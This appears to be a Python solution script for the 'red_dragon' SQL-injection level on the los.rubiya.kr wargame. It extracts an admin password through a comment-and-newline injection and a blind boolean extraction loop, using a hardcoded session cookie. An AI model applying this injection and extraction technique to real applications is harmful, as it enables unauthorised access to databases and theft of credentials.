import requests
import string

def get(id, no, pw):
    return requests.get(
        'https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php',
        params={'id':id, 'no':no, 'pw': pw,},
        cookies={'PHPSESSID': 'noefrhpr1bme4kn0b510mjnq01'}).text

# get password
password = '0x'
while True:
    for c in range(32, 128):
        print("Try", password + hex(c)[2:])
        if "<h2>Hello admin</h2>" not in get("'||pw>#", '\n' + password + hex(c)[2:], ''):
           password += hex(c-1)[2:]
           break
    else:
        password = hex(int(password, 16)+1)
        print("Password is", password)
        break

    print(password)

# password is

# certify
print(get('','', bytes.fromhex(password[2:]).decode('utf-8').lower()))
